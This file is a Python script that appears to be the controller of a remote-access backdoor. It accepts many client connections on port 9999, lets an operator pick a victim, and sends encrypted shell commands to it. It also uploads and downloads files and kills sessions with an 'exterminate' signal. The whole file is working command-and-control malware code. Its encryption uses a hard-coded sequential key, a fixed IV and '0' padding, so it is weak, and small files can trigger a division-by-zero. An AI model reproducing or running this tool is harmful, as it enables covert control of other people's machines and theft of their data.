#!/usr/bin/env python

import socket
import time
import os

from os.path import isfile
from Crypto.Cipher import AES



# constants
CLI_NUM = 20
BUFF_SIZE = 1024
AES_BUFF = 16
key = b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f" \
	+ b"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"

iv = b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"


def encrypt(x):
	return AES.new(key=key, mode=AES.MODE_CBC, IV=iv).encrypt(x)

def decrypt(x):
	return AES.new(key=key, mode=AES.MODE_CBC, IV=iv).decrypt(x)

def _cipher(x, mode):
	# so we can encrypt non modulo 16 bytes of data !?
	if(len(x) < 16):
		zeros_needed = AES_BUFF - len(x)
		x = x + (b"0" * zeros_needed)
	return mode(x)

def padding(pad, input):
	zeros_needed = AES_BUFF - len(input) % 16
	return input + (pad * zeros_needed)


# file transfer functions
def send_file(sock, file_path):
	if isfile(file_path):
		with open(file_path, "rb") as _file:
			file_size = get_file_size(_file)
			sock.send(str.encode(str(file_size)))

			chunks = file_size // AES_BUFF
			remaining_bytes = file_size % AES_BUFF

			with open(file_path, "rb") as _file:
				for i in range(0, chunks):
					sock.send(_cipher(_file.read(AES_BUFF), encrypt))

					if i % ((chunks)//9) == 0:
						print("#", end="")

				if remaining_bytes != 0:
					zeros_needed = AES_BUFF - remaining_bytes;
					data = _file.read(remaining_bytes)
					data += (b'0' * zeros_needed)
					sock.send(_cipher(data, encrypt))

			print("# 100%")
			return True

	else:
		sock.send(b"-1");
		return False
	

def recv_file(sock, file_name):
	try: file_size = int(sock.recv(1024))
	except ValueError: return False

	if file_size != -1:
		chunks = file_size // AES_BUFF
		remaining_bytes = file_size % AES_BUFF

		with open(file_name, "wb") as _file:
			for i in range(0, chunks):
				# receive, decrypt and write to file
				_file.write(_cipher(sock.recv(AES_BUFF), decrypt))

				if i % ((chunks)//9) == 0:
					print("#", end="")
				

			if remaining_bytes != 0:
				_file.write(_cipher(sock.recv(AES_BUFF), decrypt)[:remaining_bytes])
				
			print("# 100%");
			return True;

	else:
		return False

def get_file_size(file):
	# we need to save the current stream position
	# so we can set it back later
	cur = file.tell()

	# seek to the end of the file
	file.seek(0, 2)
	_end = file.tell()

	# set back the stream position
	file.seek(cur, 0)

	return _end




def main(): 
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind(("0.0.0.0", 9999))
	s.listen(CLI_NUM)

	socks = []
	clients = []

	os.system("clear");
	print("Listening for clients ...")
	while True:
		try:
			s.settimeout(2.8)
			try:
				c, addr = s.accept()
			except socket.timeout:
				time.sleep(0.8)
				continue

			if addr:
				c.settimeout(None);
				socks.append(c)
				clients.append(addr)
				
			os.system("clear")
			print("Listening for clients ...\n")
			
			if len(clients) > 0: 
				for i in range(0, len(clients)):
					print('[' + str(i+1) + '] ' + str(clients[i]))
			
			print("\n[.]\n\n[0] exit\n")
			print("Hit CTRL^C to activate a client")
			time.sleep(0.5)

		except KeyboardInterrupt:
			os.system("clear")
			print("Available clients\n")
			s.settimeout(None);

			if len(clients) > 0:
				for i in range(0, len(clients)):
					print('[' + str(i+1) + '] ' + str(clients[i]))

			print("\n[.]\n\n[0] exit\n")

			while True:
				selected_cli = input("\n:> ")
				if selected_cli == "exit" or selected_cli == '0':
					for x in socks:
						x.send(_cipher(b"exterminate\0", encrypt))
						x.close()
					s.shutdown(socket.SHUT_RDWR)
					s.close(); del s
					return
				try:
					selected_cli = int(selected_cli) - 1 
					if not (selected_cli >= 0 and selected_cli < len(clients)):
						raise ValueError;
					break
				except ValueError:
					print("try again")
					continue

			active_sock = socks[selected_cli]

			while True:
				try:
					msg = input("shell:> ") + '\0'
					active_sock.send(encrypt(padding(b'0', msg.encode())))
				
				except KeyboardInterrupt:
					active_sock.send(_cipher(b"exterminate\0", encrypt))
					
					clients.pop(selected_cli)
					socks.pop(selected_cli)
					break

if __name__ == "__main__":
	main()